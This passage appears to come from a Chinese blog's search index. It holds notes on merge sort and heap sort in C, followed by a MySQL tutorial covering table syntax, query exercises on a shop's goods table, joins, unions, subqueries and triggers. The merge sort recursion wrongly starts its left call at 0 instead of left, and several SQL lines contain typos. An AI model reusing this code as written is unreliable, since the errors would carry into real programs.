&#125;\n\n\n6-归并排序原理\n分而治之思想：\n\nDivide：将n个元素平均划分为各含n&#x2F;2个元素的子序列；\nConquer：递归的解决俩个规模为n&#x2F;2的子问题；\nCombine：合并俩个已排序的子序列。\n\n性能时间复杂度总是为O(NlogN)，空间复杂度也总为为O(N)，算法与初始序列无关，排序是稳定的。\n优化优化思路：\n\n在规模较小时，合并排序可采用直接插入；\n在写法上，可以在生成辅助数组时，俩头小，中间大，这时不需要再在后边加俩个while循环进行判断，只需一次比完\n\n//归并排序void merge(int arr[],int temp_arr[],int left,int mid, int right)&#123;    //简单归并：先复制到temp_arr，再进行归并    for (int i = left; i &lt;= right; i++)&#123;        temp_arr[i] = arr[i];    &#125;    int pa = left, pb = mid + 1;    int index = left;    while (pa &lt;= mid &amp;&amp; pb &lt;= right)&#123;        if (temp_arr[pa] &lt;= temp_arr[pb])&#123;            arr[index++] = temp_arr[pa++];        &#125;        else&#123;            arr[index++] = temp_arr[pb++];        &#125;    &#125;    while(pa &lt;= mid)&#123;        arr[index++] = temp_arr[pa++];    &#125;    while (pb &lt;= right)&#123;        arr[index++] = temp_arr[pb++];    &#125;&#125;void merge_improve(int arr[], int temp_arr[], int left, int mid, int right)&#123;    //优化归并：复制时，俩头小，中间大，一次比较完    for (int i = left; i &lt;= mid; i++)&#123;        temp_arr[i] = arr[i];    &#125;    for (int i = mid + 1; i &lt;= right; i++)&#123;        temp_arr[i] = arr[right + mid + 1 - i];    &#125;    int pa = left, pb = right, p = left;    while (p &lt;= right)&#123;        if (temp_arr[pa] &lt;= temp_arr[pb])&#123;            arr[p++] = temp_arr[pa++];        &#125;else&#123;            arr[p++] = temp_arr[pb--];        &#125;    &#125;&#125;void merge_sort(int arr[],int temp_arr[], int left, int right)&#123;    if (left &lt; right)&#123;        int mid = (left + right) / 2;        merge_sort(arr,temp_arr,0, mid);        merge_sort(arr, temp_arr,mid + 1, right);        merge(arr,temp_arr,left,mid,right);    &#125;&#125;void merge_sort(int arr[], int len)&#123;    int *temp_arr = (int*)malloc(sizeof(int)*len);    merge_sort(arr,temp_arr, 0, len - 1);&#125;\n\n\n7-堆排序原理\n堆的性质：\n\n是一棵完全二叉树\n每个节点的值都大于或等于其子节点的值，为最大堆；反之为最小堆。\n\n堆排序思想：\n\n将待排序的序列构造成一个最大堆，此时序列的最大值为根节点\n依次将根节点与待排序序列的最后一个元素交换\n再维护从根节点到该元素的前一个节点为最大堆，如此往复，最终得到一个递增序列\n\n性能时间复杂度为O(NlogN)，空间复杂度为O(1)，因为利用的排序空间仍然是初始的序列，并未开辟新空间。算法是不稳定的，与初始序列无关。\n使用场景想知道最大值或最小值时，比如优先级队列，作业调度等场景。\n代码\n/**     * 将数组arr构建大根堆     * @param arr 待调整的数组     * @param i   待调整的数组元素的下标     * @param len 数组的长度     */    void heap_adjust(int arr[], int i, int len)    &#123;        int child;        int temp;            for (; 2 * i + 1 &lt; len; i = child)        &#123;            child = 2 * i + 1;  // 子结点的位置 = 2 * 父结点的位置 + 1            // 得到子结点中键值较大的结点            if (child &lt; len - 1 &amp;&amp; arr[child + 1] &gt; arr[child])                child ++;            // 如果较大的子结点大于父结点那么把较大的子结点往上移动，替换它的父结点            if (arr[i] &lt; arr[child])            &#123;                temp = arr[i];                arr[i] = arr[child];                arr[child] = temp;            &#125;            else                break;        &#125;    &#125;        /**     * 堆排序算法     */    void heap_sort(int arr[], int len)    &#123;        int i;        // 调整序列的前半部分元素，调整完之后第一个元素是序列的最大的元素        for (int i = len / 2 - 1; i &gt;= 0; i--)        &#123;            heap_adjust(arr, i, len);        &#125;            for (i = len - 1; i &gt; 0; i--)        &#123;            // 将第1个元素与当前最后一个元素交换，保证当前的最后一个位置的元素都是现在的这个序列中最大的            int temp = arr[0];            arr[0] = arr[i];            arr[i] = temp;            // 不断缩小调整heap的范围，每一次调整完毕保证第一个元素是当前序列的最大值            heap_adjust(arr, 0, i);        &#125;    &#125;","categories":["算法"],"tags":["算法"]},{"title":"mysql","url":"/2019/03/15/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql/","content":"\n好久没用sql，都忘得干干净净，翻阅以前的学习笔记，觉得有些可记录的点，放在这里以便备用查阅\n\n一、环境搭建\nmac`安装`MySQL\n\nbrew install mysql\n\n\n# 启动mysql.server start#登录mysql -uroot\n\n二、基础知识1、数据库的连接# 例子mysql -u root -p 123456 -h 127.0.0.1\n\n\n-u 用户名\n-p 密码\n-h host主机\n\n2、库级知识\n命令后面加上分号\n\n\n显示数据库: show databases;\n选择数据库: use dbname;\n创建数据库: create database dbname charset utf8;\n删除数据库: drop database dbname;\n\n3、表级操作3.1 显示库下面的表show tables;\n\n3.2 查看表的结构desc tableName;\n\n3.3 查看表的创建过程:show create table  tableName;\n\n3.4 创建表create table tbName (列名称1　列类型　[列参数]　[not null default ],列名称N　列类型　[列参数]　[not null default ]) engine myisam/innodb charset utf8/gbk\n\n例子\ncreate table user (    id    int         auto_increment,    name  varchar(20) not null default &#x27;&#x27;,    age   tinyint unsigned not null default 0,    index id (id))engine=innodb charset=utf8;# 注:innodb是表引擎,也可以是myisam或其他,但最常用的是myisam和innodb,# charset 常用的有utf8,gbk;\n\n3.5 修改表3.5.1 修改表之增加列\nalter table tbName add 列名称１　列类型　[列参数]　[not null default ]　#(add之后的旧列名之后的语法和创建表时的列声明一样)\n\n3.5.2 修改表之修改列\nalter table tbName change 旧列名  新列名  列类型　[列参数]　[not null default ]# (注:旧列名之后的语法和创建表时的列声明一样)\n\n3.5.3 修改表之减少列\nalter table tbName drop 列名称;\n\n3.5.4 修改表之增加主键\nalter table tbName add primary key(主键所在列名);\n\n\n例:alter table goods add primary key(id) 该例是把主键建立在id列上\n\n3.5.5 修改表之删除主键\nalter table tbName　drop primary key;\n\n3.5.6 修改表之增加索引\nalter table tbName add [unique|fulltext] index 索引名(列名);\n\n3.5.7 修改表之删除索引\nalter table tbName drop index 索引名;\n\n3.5.8 清空表的数据\ntruncate tableName;\n\n4、列类型讲解4.1 列类型\ntinyint (0~255/-128~127)\nsmallint (0~65535/-32768~32767)\nmediumint\nint\nbigint\n\n参数解释\n\nunsigned 无符号(不能为负) zerofill 0填充 M 填充后的宽度\n\n\n举例:\n\ntinyint unsigned;tinyint(6) zerofill;\n\n4.2 数值型\n浮点型:float double\n格式:float(M,D) unsigned\\zerofill;\n\n4.3 字符型\nchar(m) 定长\nvarchar(m)变长\ntext\n\n\n\n\n列\n实存字符i\n实占空间\n利用率\n\n\n\nchar(M)\n0&lt;=i&lt;=M\nM\ni/m&lt;=100%\n\n\nvarchar(M)\n0&lt;=i&lt;=M\ni+1,2\ni/i+1/2&lt;100%\n\n\n4.4 日期时间类型\nyear YYYY 范围:1901~2155. 可输入值2位和4位(如98,2012)\ndate YYYY-MM-DD 如:2010-03-14\ntime HH:MM:SS 如:19:26:32\ndatetime YYYY-MM-DD HH:MM:SS 如:2010-03-14 19:26:32\ntimestamp YYYY-MM-DD HH:MM:SS\n\n\n特性:不用赋值,该列会为自己赋当前的具体时间\n\n5、增删改查基本操作5.1 插入数据insert into 表名(col1,col2,……) values(val1,val2……); # -- 插入指定列insert into 表名 values (,,,,); # -- 插入所有列insert into 表名 values\t# -- 一次插入多行 (val1,val2……),(val1,val2……),(val1,val2……);\n\n5.2 修改数据update tablename set col1=newval1,  col2=newval2,......colN=newvalNwhere 条件;\n\n5.3 删除数据delete from tablenaeme where 条件;\n\n5.4 select 查询\n条件查询 where\n\n\n条件表达式的意义，表达式为真，则该行取出\n比较运算符 = ，!=，&lt; &gt; &lt;= &gt;=\nlike , not like (‘%‘匹配任意多个字符,’_‘匹配任意单个字符) in, not in , between and\nis null , is not null\n\n\n分组 group by 一般要配合5个聚合函数使用 max, min, sum, avg, count\n筛选having\n排序order by\n限制limit\n\n6、连接查询6.1 左连接.. left join .. ontable A left join table B on tableA.col1 = tableB.col2 ;\n\n\n例句:\n\nselect 列名 from table A left join table B on tableA.col1 = tableB.col2\n\n6.2 右链接right join\n\n6.3 内连接inner join\n\n\n左右连接都是以在左边的表的数据为准,沿着左表查右表.\n内连接是以两张表都有的共同部分数据为准,也就是左右连接的数据之交集\n\n7、子查询\nwhere 型子查询:内层sql的返回值在where后作为条件表达式的一部分\n\n# 例句: select * from tableA where colA = (select colB from tableB where ...);\n\n\nfrom 型子查询:内层sql查询结果,作为一张表,供外层的sql语句再次查询\n\n例句:select * from (select * from ...) as tableName where ....\n\n8、字符集\n客户端sql编码 character_set_client\n服务器转化后的sql编码 character_set_connection\n服务器返回给客户端的结果集编码character_set_results\n快速把以上3个变量设为相同值: set names 字符集\n\n存储引擎 engine&#x3D;1\\2\n\nMyisam 速度快 不支持事务 回滚\nInnodb 速度慢 支持事务,回滚\n\n事务\n\n开启事务 start transaction\n运行sql;\n提交,同时生效\\回滚 commit\\rollback\n\n触发器\n\n触发器 trigger\n监视地点:表\n监视行为:增 删 改\n触发时间:after\\before\n触发事件:增删改\n\n创建触发器语法\ncreate trigger tgNameafter/before insert/delete/update on tableNamefor each rowsql; # -- 触发语句\n\n\n删除触发器:\n\ndrop trigger tgName;\n\n索引\n\n提高查询速度,但是降低了增删改的速度,所以使用索引时,要综合考虑.\n索引不是越多越好,一般我们在常出现于条件表达式中的列加索引.\n值越分散的列，索引的效果越好\n\n索引类型\n\nprimary key主键索引\nindex 普通索引\nunique index 唯一性索引\nfulltext index 全文索引\n\n综合练习:\n\n连接上数据库服务器\n创建一个gbk编码的数据库\n建立商品表和栏目表,字段如下:\n\n商品表:goods\n\ngoods_id　–主键,\ngoods_name – 商品名称\ncat_id – 栏目id\nbrand_id – 品牌id\ngoods_sn – 货号\ngoods_number – 库存量\nshop_price – 价格\ngoods_desc　–商品详细描述\n\n栏目表:category\n\ncat_id –主键\ncat_name – 栏目名称\nparent_id – 栏目的父id\n\n\n建表完成后,作以下操作:\n\n\n删除goods表的goods_desc 字段,及货号字段\n并增加字段:click_count – 点击量\n在goods_name列上加唯一性索引\n在shop_price列上加普通索引\n在clcik_count列上加普通索引\n删除click_count列上的索引\n\n对goods表插入以下数据:\n+----------+------------------------------+--------+----------+-----------+--------------+------------+-------------+| goods_id | goods_name                   | cat_id | brand_id | goods_sn  | goods_number | shop_price | click_count |+----------+------------------------------+--------+----------+-----------+--------------+------------+-------------+|        1 | KD876                        |      4 |        8 | ECS000000 |           10 |    1388.00 |           7 ||        4 | 诺基亚N85原装充电器          |      8 |        1 | ECS000004 |           17 |      58.00 |           0 ||        3 | 诺基亚原装5800耳机           |      8 |        1 | ECS000002 |           24 |      68.00 |           3 ||        5 | 索爱原装M2卡读卡器           |     11 |        7 | ECS000005 |            8 |      20.00 |           3 ||        6 | 胜创KINGMAX内存卡            |     11 |        0 | ECS000006 |           15 |      42.00 |           0 ||        7 | 诺基亚N85原装立体声耳机HS-82 |      8 |        1 | ECS000007 |           20 |     100.00 |           0 ||        8 | 飞利浦9@9v                   |      3 |        4 | ECS000008 |           17 |     399.00 |           9 ||        9 | 诺基亚E66                    |      3 |        1 | ECS000009 |           13 |    2298.00 |          20 ||       10 | 索爱C702c                    |      3 |        7 | ECS000010 |            7 |    1328.00 |          11 ||       11 | 索爱C702c                    |      3 |        7 | ECS000011 |            1 |    1300.00 |           0 ||       12 | 摩托罗拉A810                 |      3 |        2 | ECS000012 |            8 |     983.00 |          14 ||       13 | 诺基亚5320 XpressMusic       |      3 |        1 | ECS000013 |            8 |    1311.00 |          13 ||       14 | 诺基亚5800XM                 |      4 |        1 | ECS000014 |            4 |    2625.00 |           6 ||       15 | 摩托罗拉A810                 |      3 |        2 | ECS000015 |            3 |     788.00 |           8 ||       16 | 恒基伟业G101                 |      2 |       11 | ECS000016 |            0 |     823.33 |           3 ||       17 | 夏新N7                       |      3 |        5 | ECS000017 |            1 |    2300.00 |           2 ||       18 | 夏新T5                       |      4 |        5 | ECS000018 |            1 |    2878.00 |           0 ||       19 | 三星SGH-F258                 |      3 |        6 | ECS000019 |            0 |     858.00 |           7 ||       20 | 三星BC01                     |      3 |        6 | ECS000020 |           13 |     280.00 |          14 ||       21 | 金立 A30                     |      3 |       10 | ECS000021 |           40 |    2000.00 |           4 ||       22 | 多普达Touch HD               |      3 |        3 | ECS000022 |            0 |    5999.00 |          15 ||       23 | 诺基亚N96                    |      5 |        1 | ECS000023 |            8 |    3700.00 |          17 ||       24 | P806                         |      3 |        9 | ECS000024 |          148 |    2000.00 |          36 ||       25 | 小灵通/固话50元充值卡        |     13 |        0 | ECS000025 |            2 |      48.00 |           0 ||       26 | 小灵通/固话20元充值卡        |     13 |        0 | ECS000026 |            2 |      19.00 |           0 ||       27 | 联通100元充值卡              |     15 |        0 | ECS000027 |            2 |      95.00 |           0 ||       28 | 联通50元充值卡               |     15 |        0 | ECS000028 |            0 |      45.00 |           0 ||       29 | 移动100元充值卡              |     14 |        0 | ECS000029 |            0 |      90.00 |           0 ||       30 | 移动20元充值卡               |     14 |        0 | ECS000030 |            9 |      18.00 |           1 ||       31 | 摩托罗拉E8                   |      3 |        2 | ECS000031 |            1 |    1337.00 |           5 ||       32 | 诺基亚N85                    |      3 |        1 | ECS000032 |            1 |    3010.00 |           9 |+----------+------------------------------+--------+----------+-----------+--------------+------------+-------------+\n\n三、查询知识\n注:以下查询基于ecshop网站的商品表(ecs_goods)\n\n\n在练习时可以只取部分列,方便查看.\n\n3.1 基础查询 where的练习\n查出满足以下条件的商品\n\n3.1.1 主键为32的商品select goods_id,goods_name,shop_price      from ecs_goods     where goods_id=32;\n\n3.1.2 不属第3栏目的所有商品select goods_id,cat_id,goods_name,shop_price  from ecs_goods     where cat_id!=3;\n\n3.1.3 本店价格高于3000元的商品select goods_id,cat_id,goods_name,shop_price  from ecs_goods     where shop_price &gt;3000;\n\n3.1.4 本店价格低于或等于100元的商品select goods_id,cat_id,goods_name,shop_price  from ecs_goods where shop_price &lt;=100;\n\n3.1.5 取出第4栏目或第11栏目的商品(不许用or)select goods_id,cat_id,goods_name,shop_price  from ecs_goods     where cat_id in (4,11);\n\n3.1.6 取出100&lt;&#x3D;价格&lt;&#x3D;500的商品(不许用and)select goods_id,cat_id,goods_name,shop_price  from ecs_goods     where shop_price between 100 and 500;\n\n3.1.7 取出不属于第3栏目且不属于第11栏目的商品(and,或not in分别实现)select goods_id,cat_id,goods_name,shop_price from ecs_goods where cat_id!=3 and cat_id!=11;select goods_id,cat_id,goods_name,shop_price from ecs_goods where cat_id not in (3,11);\n\n3.1.8 取出价格大于100且小于300,或者大于4000且小于5000的商品select goods_id,cat_id,goods_name,shop_price from ecs_goods where shop_price&gt;100 and shop_price &lt;300 or shop_price &gt;4000 and shop_price &lt;5000;\n\n3.1.9 取出第3个栏目下面价格&lt;1000或&gt;3000,并且点击量&gt;5的系列商品select goods_id,cat_id,goods_name,shop_price,click_count from ecs_goods wherecat_id=3 and (shop_price &lt;1000 or shop_price&gt;3000) and click_count&gt;5;\n\n3.1.10 取出第1个栏目下面的商品(注意:1栏目下面没商品,但其子栏目下有)select goods_id,cat_id,goods_name,shop_price,click_count from ecs_goods     where cat_id in (2,3,4,5);\n\n3.1.11 取出名字以”诺基亚”开头的商品select goods_id,cat_id,goods_name,shop_price  from ecs_goods     where goods_name like &#x27;诺基亚%&#x27;;\n\n3.1.12 取出名字为”诺基亚Nxx”的手机select goods_id,cat_id,goods_name,shop_price  from ecs_goods     where goods_name like &#x27;诺基亚N__&#x27;;\n\n3.1.13 取出名字不以”诺基亚”开头的商品select goods_id,cat_id,goods_name,shop_price from ecs_goos     where goods_name not like &#x27;诺基亚%&#x27;;\n\n3.1.14 取出第3个栏目下面价格在1000到3000之间,并且点击量&gt;5 “诺基亚”开头的系列商品select goods_id,cat_id,goods_name,shop_price from ecs_goods where cat_id=3 and shop_price&gt;1000 and shop_price &lt;3000 and click_count&gt;5 and goods_name like &#x27;诺基亚%&#x27;;select goods_id,cat_id,goods_name,shop_price  from ecs_goods where shop_price between 1000 and 3000 and cat_id=3  and click_count&gt;5 and goods_name like &#x27;诺基亚%&#x27;;\n\n3.1.15 一道面试题\n有如下表和数组\n\n\n把num值处于[20,29]之间,改为20\nnum值处于[30,39]之间的,改为30\n\n+------+| num  |+------+|    3 ||   12 ||   15 ||   25 ||   23 ||   29 ||   34 ||   37 ||   32 ||   45 ||   48 ||   52 |+------+\n\n3.1.16 练习题:\n把good表中商品名为’诺基亚xxxx’的商品,改为’HTCxxxx’,\n\n\n提示:大胆的把列看成变量,参与运算,甚至调用函数来处理 。ubstring(), concat()\n\n3.2 分组查询group3.2.1 查出最贵的商品的价格select max(shop_price) from ecs_goods;\n\n3.2.2 查出最大(最新)的商品编号select max(goods_id) from ecs_goods;\n\n3.2.3 查出最便宜的商品的价格select min(shop_price) from ecs_goods;\n\n3.2.4 查出最旧(最小)的商品编号select min(goods_id) from ecs_goods;\n\n3.2.5 查询该店所有商品的库存总量select sum(goods_number) from ecs_goods;\n\n3.2.6 查询所有商品的平均价select avg(shop_price) from ecs_goods;\n\n3.2.7 查询该店一共有多少种商品select count(*) from ecs_goods;\n\n3.2.8 查询每个栏目下面\n最贵商品价格\n最低商品价格\n商品平均价格\n商品库存量\n商品种类\n\n\n提示:(5个聚合函数,sum, avg, max, min, count与group综合运用)select cat_id,max(shop_price) from ecs_goods group by cat_id;\n\n3.3 having与group综合运用查询3.3.1 查询该店的商品比市场价所节省的价格select goods_id,goods_name,market_price-shop_price as j      from ecs_goods ;\n\n3.3.2 查询每个商品所积压的货款(提示:库存*单价)select goods_id,goods_name,goods_number*shop_price  from ecs_goods\n\n3.3.3 查询该店积压的总货款select sum(goods_number*shop_price) from ecs_goods;\n\n3.3.4 查询该店每个栏目下面积压的货款.select cat_id,sum(goods_number*shop_price) as k from ecs_goods group by cat_id;\n\n3.3.5 查询比市场价省钱200元以上的商品及该商品所省的钱(where和having分别实现)select goods_id,goods_name,market_price-shop_price  as k from ecs_goodswhere market_price-shop_price &gt;200;select goods_id,goods_name,market_price-shop_price  as k from ecs_goodshaving k &gt;200;\n\n3.3.6 查询积压货款超过2W元的栏目,以及该栏目积压的货款select cat_id,sum(goods_number*shop_price) as k from ecs_goods group by cat_idhaving k&gt;20000\n\n3. 3.7 where-having-group综合练习题\n有如下表及数据\n\n+------+---------+-------+| name | subject | score |+------+---------+-------+| 张三 | 数学    |    90 || 张三 | 语文    |    50 || 张三 | 地理    |    40 || 李四 | 语文    |    55 || 李四 | 政治    |    45 || 王五 | 政治    |    30 |+------+---------+-------+\n\n\n要求:查询出2门及2门以上不及格者的平均成绩\n\n先查看每个人的平均成绩\nmysql&gt; select name,avg(score) from stu group by name;+------+------------+| name | avg(score) |+------+------------+| 张三 |    60.0000 || 李四 |    50.0000 || 王五 |    30.0000 || 赵六 |    99.0000 |+------+------------+4 rows in set (0.00 sec)\n\n\n看每个人挂科情况\n\nmysql&gt; select name,score &lt; 60 from stu;+------+------------+| name | score &lt; 60 |+------+------------+| 张三 |          0 || 张三 |          1 || 张三 |          1 || 李四 |          1 || 李四 |          1 || 王五 |          1 || 赵六 |          0 || 赵六 |          0 || 赵六 |          0 |+------+------------+9 rows in set (0.00 sec)\n\n\n计算每个人的挂科科目\n\nmysql&gt; select name,sum(score &lt; 60) from stu group by name;+------+-----------------+| name | sum(score &lt; 60) |+------+-----------------+| 张三 |               2 || 李四 |               2 || 王五 |               1 || 赵六 |               0 |+------+-----------------+4 rows in set (0.00 sec)\n\n\n同时计算每人的平均分\n\nmysql&gt; select name,sum(score &lt; 60),avg(score) as pj from stu group by name;+------+-----------------+---------+| name | sum(score &lt; 60) | pj      |+------+-----------------+---------+| 张三 |               2 | 60.0000 || 李四 |               2 | 50.0000 || 王五 |               1 | 30.0000 || 赵六 |               0 | 99.0000 |+------+-----------------+---------+4 rows in set (0.00 sec)\n\n\n利用having筛选挂科2门以上的.\n\nmysql&gt; select name,sum(score &lt; 60) as gk ,avg(score) as pj from stu group by name having gk &gt;=2;+------+------+---------+| name | gk   | pj      |+------+------+---------+| 张三 |    2 | 60.0000 || 李四 |    2 | 50.0000 |+------+------+---------+2 rows in set (0.00 sec)\n\n3.4、order by 与 limit查询3.4.1 按价格由高到低排序select goods_id,goods_name,shop_price from ecs_goods order by shop_price desc;\n\n3.4.2 按发布时间由早到晚排序select goods_id,goods_name,add_time from ecs_goods order by add_time;\n\n3.4.3 接栏目由低到高排序,栏目内部按价格由高到低排序select goods_id,cat_id,goods_name,shop_price from ecs_goods     order by cat_id ,shop_price desc;\n\n3.4.4 取出价格最高的前三名商品select goods_id,goods_name,shop_price from ecs_goods order by shop_price desc limit 3;\n\n3.4.5 取出点击量前三名到前5名的商品select goods_id,goods_name,click_count from ecs_goods order by click_count desc limit 2,3;\n\n3.5 连接查询3.5.1 取出所有商品的商品名,栏目名,价格select goods_name,cat_name,shop_price from ecs_goods left join ecs_categoryon ecs_goods.cat_id=ecs_category.cat_id;\n\n3.5.2 取出第4个栏目下的商品的商品名,栏目名,价格select goods_name,cat_name,shop_price from ecs_goods left join ecs_categoryon ecs_goods.cat_id=ecs_category.cat_idwhere ecs_goods.cat_id = 4;\n\n3.5.3 取出第4个栏目下的商品的商品名,栏目名,与品牌名select goods_name,cat_name,brand_name from ecs_goods left join ecs_categoryon ecs_goods.cat_id=ecs_category.cat_idleft join ecs_brand on ecs_goods.brand_id=ecs_brand.brand_idwhere ecs_goods.cat_id = 4;\n\n3.5.4 面试题\n根据给出的表结构按要求写出SQL语句。\n\nMatch 赛程表\n\n\n\n字段名称\n字段类型\n描述\n\n\n\nmatchID\nint\n主键\n\n\nhostTeamID\nint\n主队的ID\n\n\nguestTeamID\nint\n客队的ID\n\n\nmatchResult\nvarchar(20)\n比赛结果，如（2:0）\n\n\nmatchTime\ndate\n比赛开始时间\n\n\nTeam 参赛队伍表\n\n\n\n字段名称\n字段类型\n描述\n\n\n\nteamID\nint\n主键\n\n\nteamName\nvarchar(20)\n队伍名称\n\n\n\nMatch的hostTeamID与guestTeamID都与Team中的teamID关联\n查出 2006-6-1 到2006-7-1之间举行的所有比赛，并且用以下形式列出：\n拜仁 2：0 不来梅 2006-6-21\n\nmysql&gt; select * from m;+-----+------+------+------+------------+| mid | hid  | gid  | mres | matime     |+-----+------+------+------+------------+|   1 |    1 |    2 | 2:0  | 2006-05-21 ||   2 |    2 |    3 | 1:2  | 2006-06-21 ||   3 |    3 |    1 | 2:5  | 2006-06-25 ||   4 |    2 |    1 | 3:2  | 2006-07-21 |+-----+------+------+------+------------+4 rows in set (0.00 sec)mysql&gt; select * from t;+------+----------+| tid  | tname    |+------+----------+|    1 | 国安     ||    2 | 申花     ||    3 | 公益联队 |+------+----------+3 rows in set (0.00 sec)mysql&gt; select hid,t1.tname as hname ,mres,gid,t2.tname as gname,matime    -&gt; from     -&gt; m left join t as t1    -&gt; on m.hid = t1.tid    -&gt; left join t as t2    -&gt; on m.gid = t2.tid;+------+----------+------+------+----------+------------+| hid  | hname    | mres | gid  | gname    | matime     |+------+----------+------+------+----------+------------+|    1 | 国安     | 2:0  |    2 | 申花     | 2006-05-21 ||    2 | 申花     | 1:2  |    3 | 公益联队 | 2006-06-21 ||    3 | 公益联队 | 2:5  |    1 | 国安     | 2006-06-25 ||    2 | 申花     | 3:2  |    1 | 国安     | 2006-07-21 |+------+----------+------+------+----------+------------+4 rows in set (0.00 sec)\n\n3.6、union查询\n把ecs_comment,ecs_feedback两个表中的数据,各取出4列,并把结果集union成一个结果集\n\nA表:+------+------+| id   | num  |+------+------+| a    |    5 || b    |   10 || c    |   15 || d    |   10 |+------+------+B表:+------+------+| id   | num  |+------+------+| b    |    5 || c    |   15 || d    |   20 || e    |   99 |+------+------+\n\n要求查询出以下效果:\n+------+----------+| id   |    num   |+------+----------+| a    |        5 || b    |       15 || c    |       30 || d    |       30 || e    |       99 |+------+----------+create table a (id char(1),num int) engine myisam charset utf8;insert into a values (&#x27;a&#x27;,5),(&#x27;b&#x27;,10),(&#x27;c&#x27;,15),(&#x27;d&#x27;,10);create table b (id char(1),num int) engine myisam charset utf8;insert into b values (&#x27;b&#x27;,5),(&#x27;c&#x27;,15),(&#x27;d&#x27;,20),(&#x27;e&#x27;,99);mysql&gt; # 合并 ,注意all的作用mysql&gt; select * from ta     -&gt; union all    -&gt; select * from tb;+------+------+| id   | num  |+------+------+| a    |    5 || b    |   10 || c    |   15 || d    |   10 || b    |    5 || c    |   15 || d    |   20 || e    |   99 |+------+------+\n\n参考答案:\nmysql&gt; # sum,group求和mysql&gt; select id,sum(num) from (select * from ta union all select * from tb) as tmp group by id;+------+----------+| id   | sum(num) |+------+----------+| a    |        5 || b    |       15 || c    |       30 || d    |       30 || e    |       99 |+------+----------+5 rows in set (0.00 sec)\n\n3.7、子查询:查询出最新一行商品(以商品编号最大为最新,用子查询实现)\nselect goods_id,goods_name from      ecs_goods where goods_id =(select max(goods_id) from ecs_goods);\n\n\n查询出编号为19的商品的栏目名称(用左连接查询和子查询分别)\n用where型子查询把ecs_goods表中的每个栏目下面最新的商品取出来\n\nselect goods_id,goods_name,cat_id from ecs_goods where goods_id in (select max(goods_id) from ecs_goods group by cat_id);\n\n用from型子查询把ecs_goods表中的每个栏目下面最新的商品取出来\nselect * from (select goods_id,cat_id,goods_name from ecs_goods order by goods_id desc) as t group by cat_id;\n\n用exists型子查询,查出所有有商品的栏目\nselect * from categorywhere exists (select * from goods where goods.cat_id=category.cat_id);\n\n创建触发器:\nCREATE  trigger tg2after insert on ordfor each rowupdate goods set goods_number=goods_number-new.num where id=new.gidCREATE trigger tg3after delete on ordfor each rowupdate goods set goods_number=good_number+old.num where id=old.gidCREATE  trigger tg4after update on ordfor each rowupdate goods set goods_number=goods_number+old.num-new.num where id=old.gid\n\n四、常用表管理语句\n设置字符编码 set names gbk;\n查看所有数据库：show databases;\n查看所有表：show tables\n查看表结构：desc 表名/视图名\n选择表 use 表名;\n查看建表过程：show create table 表名\n查看建视图过程：show create view 视图\n查看所有详细表信息：show table status\\G(让结果显示好看一些)\n查看某张表详细信息：show table status where name=&#39;goods（表名）&#39;\\G\n删除表：drop table 表名\n删除视图：drop view 视图名；\n删除列：alter table drop column 指定列\n改表名：rename table oldName to newName\n更新表：update 表名 set 字段\n插入数据：insert into 表名 value()\n清空数据：truncate 表名;(相当于删除表在重建)\n写错语句退出:\\c\n让结果显示好看一些:\\G\n\n五、查询总结5.1 insert\ninsert into 表名 插入列与值要严格对应\n数字不必加单引号 字符串必须加单引号\n例子：insert into test(age,name)values(10,&#39;小明&#39;);\n\n5.2 update操作// 例子：update user set age=8 where name=lianying;//（注意where条件不加会影响所有行，需要小心）\n\n5.3 delete操作\n不可能针对某一列删除 要删必须一行\ndelete from 表名 where 添加\ndelete from user where uid=1;（必须加上添加，否则全部数据删除）\n\n5.4 select查找\nselect * from 表名（全部查出）\nselect uid,name from user where uid&gt;10;\nselect * from user where uid=11;\n\n5.5 select查询模型（重要）\nselect * from 表名 where 1（where是一个表达式 为真则取出来 为假不取）\n把列看成变量，既然是变量就能参与运。这个过程称为广义投影（比如：取出两列参与运算）也可以带到函数里面计算\n\n\n注意：NULL：查询方法： select * from test where name is （not）null\n\n5.6 limit用法（做分页类能用到）\n限制取出条目（limit有两个参数 ：偏移量 取出的条目）\n\nselect goods_id,goods_name,shop_price\t-&gt; from goods\t-&gt; order by shop_price desc\t-&gt; limit  0,3;\n\n5.7 子句的查询陷阱\n5种语句有严格的顺序，where ，group by,having,order by,limit不能颠倒顺序\n\n# 例子:语句有严格的顺序mysql&gt; select id,sum(num) \t\t\t\t\t-&gt; from\t\t\t\t\t-&gt; (select * from a union select * from b) as temp\t\t\t\t\t-&gt; group by id\t\t\t\t\t-&gt; having sum(num)&gt;10\t\t\t\t\t-&gt; order by sum(num) desc\t\t\t\t\t-&gt; limit 0,1;\n\n5.8 子查询where字查询：（内层的查询结果作为外层的比较条件）\n\n静态的：select goods_id,goods_name from goods where goods_id&#x3D;32;\n动态的：select goods_id,goods_name from goods where goods_id&#x3D;(select max(goods_id) from goods);\n\n#取出每个栏目下最新的商品：select goods_id,cat_id,goods_name from goods where goods_id in (select max(goods_id) from goods group by cat_id);\n\n5.9 from子查询#每个栏目下最新的商品：\t\tmysql&gt; select goods_id,goods_name from (select * from goods where 1 order by cat_id desc) as tmp\t\t\t-&gt; group by cat_id;\n\n5.10 exists子查询：#查询栏目下是否有商品\t\tmysql&gt; select * from category\t\t\t-&gt; where exists(select * from goods where goods.cat_id=category.cat_id)\n\n5.11 内连接查询（重要）\n内连接是左右连接结果的交集\n\nselect xxx from\t\t\ttable1 inner jion table2 on table1.xx=table2.xx\t\t\t\t\tmysql&gt; select boy.hid,boy.bname,girl.hid,girl.gname\t\t\t-&gt; from\t\t\t-&gt; boy inner join girl on boy.hid=girl.hid;\n\n5.12 左连接特点\n以左表的数据为标准，去找右表的数据，查不到的为NULL\n\n#左连接mysql&gt; select boy.hid,boy.bname,girl.hid,girl.gname\t-&gt; from\t-&gt; boy left join girl on boy.hid=girl.hid;#右连接mysql&gt; select boy.hid,boy.bname,girl.hid,girl.gname-&gt; from-&gt; boy right join girl on boy.hid=girl.hid;mysql&gt; select goods_id,cat_name,goods_name,shop_price\t-&gt; from\t-&gt; goods left join category on goods.cat_id= category.cat_id\t-&gt; where goods.cat_id=4;\n\n5.13 union查询\n把2条或多条的额查询结果，合并成1个结果集\n\n\nsql1 N行\nsql2 M行\nsql1 union sql2，N+M行\n\n\n\nunion语句必须满足一个条件：各语句取出的列数要相同\nunion语句中不用写order by 因为sql合并后得到总的结果集可以order by字句order by失去意义\n场景：2条语句，各自的where非常复杂，可以简化成简单的条件在union\n注意：使用union时，完全相等的行将会被合并。合并是比较耗时的操作，一般不让union合并，使用union all可以避免合并 